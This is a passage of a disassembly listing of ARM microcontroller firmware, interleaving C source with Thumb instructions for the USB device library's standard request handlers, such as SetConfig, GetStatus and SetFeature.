 800be58:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800be5c:	b2db      	uxtb	r3, r3
 800be5e:	2b03      	cmp	r3, #3
 800be60:	d104      	bne.n	800be6c <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800be62:	6839      	ldr	r1, [r7, #0]
 800be64:	6878      	ldr	r0, [r7, #4]
 800be66:	f000 f9bc 	bl	800c1e2 <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be6a:	e01d      	b.n	800bea8 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800be6c:	687b      	ldr	r3, [r7, #4]
 800be6e:	7bfa      	ldrb	r2, [r7, #15]
 800be70:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800be74:	7bfb      	ldrb	r3, [r7, #15]
 800be76:	4619      	mov	r1, r3
 800be78:	6878      	ldr	r0, [r7, #4]
 800be7a:	f000 ffbf 	bl	800cdfc <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800be7e:	6878      	ldr	r0, [r7, #4]
 800be80:	f000 fa7a 	bl	800c378 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800be84:	7bfb      	ldrb	r3, [r7, #15]
 800be86:	2b00      	cmp	r3, #0
 800be88:	d004      	beq.n	800be94 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800be8a:	687b      	ldr	r3, [r7, #4]
 800be8c:	2202      	movs	r2, #2
 800be8e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be92:	e009      	b.n	800bea8 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800be94:	687b      	ldr	r3, [r7, #4]
 800be96:	2201      	movs	r2, #1
 800be98:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be9c:	e004      	b.n	800bea8 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800be9e:	6839      	ldr	r1, [r7, #0]
 800bea0:	6878      	ldr	r0, [r7, #4]
 800bea2:	f000 f99e 	bl	800c1e2 <USBD_CtlError>
  }
}
 800bea6:	bf00      	nop
 800bea8:	bf00      	nop
 800beaa:	3710      	adds	r7, #16
 800beac:	46bd      	mov	sp, r7
 800beae:	bd80      	pop	{r7, pc}

0800beb0 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800beb0:	b580      	push	{r7, lr}
 800beb2:	b084      	sub	sp, #16
 800beb4:	af00      	add	r7, sp, #0
 800beb6:	6078      	str	r0, [r7, #4]
 800beb8:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800beba:	2300      	movs	r3, #0
 800bebc:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800bebe:	683b      	ldr	r3, [r7, #0]
 800bec0:	885b      	ldrh	r3, [r3, #2]
 800bec2:	b2da      	uxtb	r2, r3
 800bec4:	4b4e      	ldr	r3, [pc, #312]	; (800c000 <USBD_SetConfig+0x150>)
 800bec6:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800bec8:	4b4d      	ldr	r3, [pc, #308]	; (800c000 <USBD_SetConfig+0x150>)
 800beca:	781b      	ldrb	r3, [r3, #0]
 800becc:	2b01      	cmp	r3, #1
 800bece:	d905      	bls.n	800bedc <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800bed0:	6839      	ldr	r1, [r7, #0]
 800bed2:	6878      	ldr	r0, [r7, #4]
 800bed4:	f000 f985 	bl	800c1e2 <USBD_CtlError>
    return USBD_FAIL;
 800bed8:	2303      	movs	r3, #3
 800beda:	e08c      	b.n	800bff6 <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800bedc:	687b      	ldr	r3, [r7, #4]
 800bede:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bee2:	b2db      	uxtb	r3, r3
 800bee4:	2b02      	cmp	r3, #2
 800bee6:	d002      	beq.n	800beee <USBD_SetConfig+0x3e>
 800bee8:	2b03      	cmp	r3, #3
 800beea:	d029      	beq.n	800bf40 <USBD_SetConfig+0x90>
 800beec:	e075      	b.n	800bfda <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800beee:	4b44      	ldr	r3, [pc, #272]	; (800c000 <USBD_SetConfig+0x150>)
 800bef0:	781b      	ldrb	r3, [r3, #0]
 800bef2:	2b00      	cmp	r3, #0
 800bef4:	d020      	beq.n	800bf38 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800bef6:	4b42      	ldr	r3, [pc, #264]	; (800c000 <USBD_SetConfig+0x150>)
 800bef8:	781b      	ldrb	r3, [r3, #0]
 800befa:	461a      	mov	r2, r3
 800befc:	687b      	ldr	r3, [r7, #4]
 800befe:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bf00:	4b3f      	ldr	r3, [pc, #252]	; (800c000 <USBD_SetConfig+0x150>)
 800bf02:	781b      	ldrb	r3, [r3, #0]
 800bf04:	4619      	mov	r1, r3
 800bf06:	6878      	ldr	r0, [r7, #4]
 800bf08:	f7ff f848 	bl	800af9c <USBD_SetClassConfig>
 800bf0c:	4603      	mov	r3, r0
 800bf0e:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800bf10:	7bfb      	ldrb	r3, [r7, #15]
 800bf12:	2b00      	cmp	r3, #0
 800bf14:	d008      	beq.n	800bf28 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800bf16:	6839      	ldr	r1, [r7, #0]
 800bf18:	6878      	ldr	r0, [r7, #4]
 800bf1a:	f000 f962 	bl	800c1e2 <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bf1e:	687b      	ldr	r3, [r7, #4]
 800bf20:	2202      	movs	r2, #2
 800bf22:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bf26:	e065      	b.n	800bff4 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bf28:	6878      	ldr	r0, [r7, #4]
 800bf2a:	f000 fa25 	bl	800c378 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800bf2e:	687b      	ldr	r3, [r7, #4]
 800bf30:	2203      	movs	r2, #3
 800bf32:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bf36:	e05d      	b.n	800bff4 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bf38:	6878      	ldr	r0, [r7, #4]
 800bf3a:	f000 fa1d 	bl	800c378 <USBD_CtlSendStatus>
      break;
 800bf3e:	e059      	b.n	800bff4 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800bf40:	4b2f      	ldr	r3, [pc, #188]	; (800c000 <USBD_SetConfig+0x150>)
 800bf42:	781b      	ldrb	r3, [r3, #0]
 800bf44:	2b00      	cmp	r3, #0
 800bf46:	d112      	bne.n	800bf6e <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bf48:	687b      	ldr	r3, [r7, #4]
 800bf4a:	2202      	movs	r2, #2
 800bf4c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800bf50:	4b2b      	ldr	r3, [pc, #172]	; (800c000 <USBD_SetConfig+0x150>)
 800bf52:	781b      	ldrb	r3, [r3, #0]
 800bf54:	461a      	mov	r2, r3
 800bf56:	687b      	ldr	r3, [r7, #4]
 800bf58:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bf5a:	4b29      	ldr	r3, [pc, #164]	; (800c000 <USBD_SetConfig+0x150>)
 800bf5c:	781b      	ldrb	r3, [r3, #0]
 800bf5e:	4619      	mov	r1, r3
 800bf60:	6878      	ldr	r0, [r7, #4]
 800bf62:	f7ff f837 	bl	800afd4 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800bf66:	6878      	ldr	r0, [r7, #4]
 800bf68:	f000 fa06 	bl	800c378 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bf6c:	e042      	b.n	800bff4 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800bf6e:	4b24      	ldr	r3, [pc, #144]	; (800c000 <USBD_SetConfig+0x150>)
 800bf70:	781b      	ldrb	r3, [r3, #0]
 800bf72:	461a      	mov	r2, r3
 800bf74:	687b      	ldr	r3, [r7, #4]
 800bf76:	685b      	ldr	r3, [r3, #4]
 800bf78:	429a      	cmp	r2, r3
 800bf7a:	d02a      	beq.n	800bfd2 <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bf7c:	687b      	ldr	r3, [r7, #4]
 800bf7e:	685b      	ldr	r3, [r3, #4]
 800bf80:	b2db      	uxtb	r3, r3
 800bf82:	4619      	mov	r1, r3
 800bf84:	6878      	ldr	r0, [r7, #4]
 800bf86:	f7ff f825 	bl	800afd4 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800bf8a:	4b1d      	ldr	r3, [pc, #116]	; (800c000 <USBD_SetConfig+0x150>)
 800bf8c:	781b      	ldrb	r3, [r3, #0]
 800bf8e:	461a      	mov	r2, r3
 800bf90:	687b      	ldr	r3, [r7, #4]
 800bf92:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bf94:	4b1a      	ldr	r3, [pc, #104]	; (800c000 <USBD_SetConfig+0x150>)
 800bf96:	781b      	ldrb	r3, [r3, #0]
 800bf98:	4619      	mov	r1, r3
 800bf9a:	6878      	ldr	r0, [r7, #4]
 800bf9c:	f7fe fffe 	bl	800af9c <USBD_SetClassConfig>
 800bfa0:	4603      	mov	r3, r0
 800bfa2:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800bfa4:	7bfb      	ldrb	r3, [r7, #15]
 800bfa6:	2b00      	cmp	r3, #0
 800bfa8:	d00f      	beq.n	800bfca <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800bfaa:	6839      	ldr	r1, [r7, #0]
 800bfac:	6878      	ldr	r0, [r7, #4]
 800bfae:	f000 f918 	bl	800c1e2 <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bfb2:	687b      	ldr	r3, [r7, #4]
 800bfb4:	685b      	ldr	r3, [r3, #4]
 800bfb6:	b2db      	uxtb	r3, r3
 800bfb8:	4619      	mov	r1, r3
 800bfba:	6878      	ldr	r0, [r7, #4]
 800bfbc:	f7ff f80a 	bl	800afd4 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bfc0:	687b      	ldr	r3, [r7, #4]
 800bfc2:	2202      	movs	r2, #2
 800bfc4:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bfc8:	e014      	b.n	800bff4 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bfca:	6878      	ldr	r0, [r7, #4]
 800bfcc:	f000 f9d4 	bl	800c378 <USBD_CtlSendStatus>
      break;
 800bfd0:	e010      	b.n	800bff4 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bfd2:	6878      	ldr	r0, [r7, #4]
 800bfd4:	f000 f9d0 	bl	800c378 <USBD_CtlSendStatus>
      break;
 800bfd8:	e00c      	b.n	800bff4 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800bfda:	6839      	ldr	r1, [r7, #0]
 800bfdc:	6878      	ldr	r0, [r7, #4]
 800bfde:	f000 f900 	bl	800c1e2 <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bfe2:	4b07      	ldr	r3, [pc, #28]	; (800c000 <USBD_SetConfig+0x150>)
 800bfe4:	781b      	ldrb	r3, [r3, #0]
 800bfe6:	4619      	mov	r1, r3
 800bfe8:	6878      	ldr	r0, [r7, #4]
 800bfea:	f7fe fff3 	bl	800afd4 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800bfee:	2303      	movs	r3, #3
 800bff0:	73fb      	strb	r3, [r7, #15]
      break;
 800bff2:	bf00      	nop
  }

  return ret;
 800bff4:	7bfb      	ldrb	r3, [r7, #15]
}
 800bff6:	4618      	mov	r0, r3
 800bff8:	3710      	adds	r7, #16
 800bffa:	46bd      	mov	sp, r7
 800bffc:	bd80      	pop	{r7, pc}
 800bffe:	bf00      	nop
 800c000:	200003bc 	.word	0x200003bc

0800c004 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c004:	b580      	push	{r7, lr}
 800c006:	b082      	sub	sp, #8
 800c008:	af00      	add	r7, sp, #0
 800c00a:	6078      	str	r0, [r7, #4]
 800c00c:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800c00e:	683b      	ldr	r3, [r7, #0]
 800c010:	88db      	ldrh	r3, [r3, #6]
 800c012:	2b01      	cmp	r3, #1
 800c014:	d004      	beq.n	800c020 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800c016:	6839      	ldr	r1, [r7, #0]
 800c018:	6878      	ldr	r0, [r7, #4]
 800c01a:	f000 f8e2 	bl	800c1e2 <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800c01e:	e023      	b.n	800c068 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800c020:	687b      	ldr	r3, [r7, #4]
 800c022:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c026:	b2db      	uxtb	r3, r3
 800c028:	2b02      	cmp	r3, #2
 800c02a:	dc02      	bgt.n	800c032 <USBD_GetConfig+0x2e>
 800c02c:	2b00      	cmp	r3, #0
 800c02e:	dc03      	bgt.n	800c038 <USBD_GetConfig+0x34>
 800c030:	e015      	b.n	800c05e <USBD_GetConfig+0x5a>
 800c032:	2b03      	cmp	r3, #3
 800c034:	d00b      	beq.n	800c04e <USBD_GetConfig+0x4a>
 800c036:	e012      	b.n	800c05e <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800c038:	687b      	ldr	r3, [r7, #4]
 800c03a:	2200      	movs	r2, #0
 800c03c:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800c03e:	687b      	ldr	r3, [r7, #4]
 800c040:	3308      	adds	r3, #8
 800c042:	2201      	movs	r2, #1
 800c044:	4619      	mov	r1, r3
 800c046:	6878      	ldr	r0, [r7, #4]
 800c048:	f000 f93c 	bl	800c2c4 <USBD_CtlSendData>
        break;
 800c04c:	e00c      	b.n	800c068 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800c04e:	687b      	ldr	r3, [r7, #4]
 800c050:	3304      	adds	r3, #4
 800c052:	2201      	movs	r2, #1
 800c054:	4619      	mov	r1, r3
 800c056:	6878      	ldr	r0, [r7, #4]
 800c058:	f000 f934 	bl	800c2c4 <USBD_CtlSendData>
        break;
 800c05c:	e004      	b.n	800c068 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800c05e:	6839      	ldr	r1, [r7, #0]
 800c060:	6878      	ldr	r0, [r7, #4]
 800c062:	f000 f8be 	bl	800c1e2 <USBD_CtlError>
        break;
 800c066:	bf00      	nop
}
 800c068:	bf00      	nop
 800c06a:	3708      	adds	r7, #8
 800c06c:	46bd      	mov	sp, r7
 800c06e:	bd80      	pop	{r7, pc}

0800c070 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c070:	b580      	push	{r7, lr}
 800c072:	b082      	sub	sp, #8
 800c074:	af00      	add	r7, sp, #0
 800c076:	6078      	str	r0, [r7, #4]
 800c078:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c07a:	687b      	ldr	r3, [r7, #4]
 800c07c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c080:	b2db      	uxtb	r3, r3
 800c082:	3b01      	subs	r3, #1
 800c084:	2b02      	cmp	r3, #2
 800c086:	d81e      	bhi.n	800c0c6 <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c088:	683b      	ldr	r3, [r7, #0]
 800c08a:	88db      	ldrh	r3, [r3, #6]
 800c08c:	2b02      	cmp	r3, #2
 800c08e:	d004      	beq.n	800c09a <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c090:	6839      	ldr	r1, [r7, #0]
 800c092:	6878      	ldr	r0, [r7, #4]
 800c094:	f000 f8a5 	bl	800c1e2 <USBD_CtlError>
        break;
 800c098:	e01a      	b.n	800c0d0 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c09a:	687b      	ldr	r3, [r7, #4]
 800c09c:	2201      	movs	r2, #1
 800c09e:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c0a0:	687b      	ldr	r3, [r7, #4]
 800c0a2:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c0a6:	2b00      	cmp	r3, #0
 800c0a8:	d005      	beq.n	800c0b6 <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c0aa:	687b      	ldr	r3, [r7, #4]
 800c0ac:	68db      	ldr	r3, [r3, #12]
 800c0ae:	f043 0202 	orr.w	r2, r3, #2
 800c0b2:	687b      	ldr	r3, [r7, #4]
 800c0b4:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c0b6:	687b      	ldr	r3, [r7, #4]
 800c0b8:	330c      	adds	r3, #12
 800c0ba:	2202      	movs	r2, #2
 800c0bc:	4619      	mov	r1, r3
 800c0be:	6878      	ldr	r0, [r7, #4]
 800c0c0:	f000 f900 	bl	800c2c4 <USBD_CtlSendData>
      break;
 800c0c4:	e004      	b.n	800c0d0 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c0c6:	6839      	ldr	r1, [r7, #0]
 800c0c8:	6878      	ldr	r0, [r7, #4]
 800c0ca:	f000 f88a 	bl	800c1e2 <USBD_CtlError>
      break;
 800c0ce:	bf00      	nop
  }
}
 800c0d0:	bf00      	nop
 800c0d2:	3708      	adds	r7, #8
 800c0d4:	46bd      	mov	sp, r7
 800c0d6:	bd80      	pop	{r7, pc}

0800c0d8 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c0d8:	b580      	push	{r7, lr}
 800c0da:	b082      	sub	sp, #8
 800c0dc:	af00      	add	r7, sp, #0
 800c0de:	6078      	str	r0, [r7, #4]
 800c0e0:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c0e2:	683b      	ldr	r3, [r7, #0]
 800c0e4:	885b      	ldrh	r3, [r3, #2]
 800c0e6:	2b01      	cmp	r3, #1
 800c0e8:	d107      	bne.n	800c0fa <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c0ea:	687b      	ldr	r3, [r7, #4]
 800c0ec:	2201      	movs	r2, #1
 800c0ee:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c0f2:	6878      	ldr	r0, [r7, #4]
 800c0f4:	f000 f940 	bl	800c378 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c0f8:	e013      	b.n	800c122 <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c0fa:	683b      	ldr	r3, [r7, #0]
 800c0fc:	885b      	ldrh	r3, [r3, #2]
 800c0fe:	2b02      	cmp	r3, #2
 800c100:	d10b      	bne.n	800c11a <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c102:	683b      	ldr	r3, [r7, #0]
 800c104:	889b      	ldrh	r3, [r3, #4]
 800c106:	0a1b      	lsrs	r3, r3, #8
 800c108:	b29b      	uxth	r3, r3
 800c10a:	b2da      	uxtb	r2, r3
 800c10c:	687b      	ldr	r3, [r7, #4]
 800c10e:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c112:	6878      	ldr	r0, [r7, #4]
 800c114:	f000 f930 	bl	800c378 <USBD_CtlSendStatus>
}
 800c118:	e003      	b.n	800c122 <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c11a:	6839      	ldr	r1, [r7, #0]
 800c11c:	6878      	ldr	r0, [r7, #4]
 800c11e:	f000 f860 	bl	800c1e2 <USBD_CtlError>
}
 800c122:	bf00      	nop
 800c124:	3708      	adds	r7, #8
 800c126:	46bd      	mov	sp, r7
 800c128:	bd80      	pop	{r7, pc}

0800c12a <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c12a:	b580      	push	{r7, lr}
 800c12c:	b082      	sub	sp, #8
 800c12e:	af00      	add	r7, sp, #0
 800c130:	6078      	str	r0, [r7, #4]
 800c132:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c134:	687b      	ldr	r3, [r7, #4]
 800c136:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c13a:	b2db      	uxtb	r3, r3
 800c13c:	3b01      	subs	r3, #1
 800c13e:	2b02      	cmp	r3, #2
 800c140:	d80b      	bhi.n	800c15a <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c142:	683b      	ldr	r3, [r7, #0]
 800c144:	885b      	ldrh	r3, [r3, #2]
 800c146:	2b01      	cmp	r3, #1
 800c148:	d10c      	bne.n	800c164 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c14a:	687b      	ldr	r3, [r7, #4]
 800c14c:	2200      	movs	r2, #0
 800c14e:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c152:	6878      	ldr	r0, [r7, #4]
 800c154:	f000 f910 	bl	800c378 <USBD_CtlSendStatus>
      }
      break;
 800c158:	e004      	b.n	800c164 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c15a:	6839      	ldr	r1, [r7, #0]
 800c15c:	6878      	ldr	r0, [r7, #4]
 800c15e:	f000 f840 	bl	800c1e2 <USBD_CtlError>
      break;
 800c162:	e000      	b.n	800c166 <USBD_ClrFeature+0x3c>
      break;
 800c164:	bf00      	nop
  }
}
 800c166:	bf00      	nop
 800c168:	3708      	adds	r7, #8
 800c16a:	46bd      	mov	sp, r7
 800c16c:	bd80      	pop	{r7, pc}

0800c16e <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c16e:	b580      	push	{r7, lr}
 800c170:	b084      	sub	sp, #16
 800c172:	af00      	add	r7, sp, #0
 800c174:	6078      	str	r0, [r7, #4]
 800c176:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c178:	683b      	ldr	r3, [r7, #0]
 800c17a:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c17c:	68fb      	ldr	r3, [r7, #12]
 800c17e:	781a      	ldrb	r2, [r3, #0]
 800c180:	687b      	ldr	r3, [r7, #4]
 800c182:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c184:	68fb      	ldr	r3, [r7, #12]
 800c186:	3301      	adds	r3, #1
 800c188:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c18a:	68fb      	ldr	r3, [r7, #12]
 800c18c:	781a      	ldrb	r2, [r3, #0]
 800c18e:	687b      	ldr	r3, [r7, #4]
 800c190:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c192:	68fb      	ldr	r3, [r7, #12]
 800c194:	3301      	adds	r3, #1
 800c196:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c198:	68f8      	ldr	r0, [r7, #12]
 800c19a:	f7ff fa16 	bl	800b5ca <SWAPBYTE>
 800c19e:	4603      	mov	r3, r0
 800c1a0:	461a      	mov	r2, r3
 800c1a2:	687b      	ldr	r3, [r7, #4]
 800c1a4:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c1a6:	68fb      	ldr	r3, [r7, #12]
 800c1a8:	3301      	adds	r3, #1
 800c1aa:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c1ac:	68fb      	ldr	r3, [r7, #12]
 800c1ae:	3301      	adds	r3, #1
 800c1b0:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c1b2:	68f8      	ldr	r0, [r7, #12]
 800c1b4:	f7ff fa09 	bl	800b5ca <SWAPBYTE>
 800c1b8:	4603      	mov	r3, r0
 800c1ba:	461a      	mov	r2, r3
 800c1bc:	687b      	ldr	r3, [r7, #4]
 800c1be:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c1c0:	68fb      	ldr	r3, [r7, #12]
 800c1c2:	3301      	adds	r3, #1
 800c1c4:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c1c6:	68fb      	ldr	r3, [r7, #12]
 800c1c8:	3301      	adds	r3, #1
 800c1ca:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c1cc:	68f8      	ldr	r0, [r7, #12]
 800c1ce:	f7ff f9fc 	bl	800b5ca <SWAPBYTE>
 800c1d2:	4603      	mov	r3, r0
 800c1d4:	461a      	mov	r2, r3
 800c1d6:	687b      	ldr	r3, [r7, #4]
 800c1d8:	80da      	strh	r2, [r3, #6]
}
 800c1da:	bf00      	nop
 800c1dc:	3710      	adds	r7, #16
 800c1de:	46bd      	mov	sp, r7
 800c1e0:	bd80      	pop	{r7, pc}

0800c1e2 <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c1e2:	b580      	push	{r7, lr}
 800c1e4:	b082      	sub	sp, #8
 800c1e6:	af00      	add	r7, sp, #0
 800c1e8:	6078      	str	r0, [r7, #4]
 800c1ea:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c1ec:	2180      	movs	r1, #128	; 0x80
 800c1ee:	6878      	ldr	r0, [r7, #4]
 800c1f0:	f000 fd6a 	bl	800ccc8 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c1f4:	2100      	movs	r1, #0
 800c1f6:	6878      	ldr	r0, [r7, #4]
 800c1f8:	f000 fd66 	bl	800ccc8 <USBD_LL_StallEP>
}
 800c1fc:	bf00      	nop
 800c1fe:	3708      	adds	r7, #8
 800c200:	46bd      	mov	sp, r7
 800c202:	bd80      	pop	{r7, pc}

0800c204 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c204:	b580      	push	{r7, lr}
 800c206:	b086      	sub	sp, #24
 800c208:	af00      	add	r7, sp, #0
 800c20a:	60f8      	str	r0, [r7, #12]
 800c20c:	60b9      	str	r1, [r7, #8]
 800c20e:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c210:	2300      	movs	r3, #0
 800c212:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c214:	68fb      	ldr	r3, [r7, #12]
 800c216:	2b00      	cmp	r3, #0
 800c218:	d036      	beq.n	800c288 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c21a:	68fb      	ldr	r3, [r7, #12]
 800c21c:	613b      	str	r3, [r7, #16]
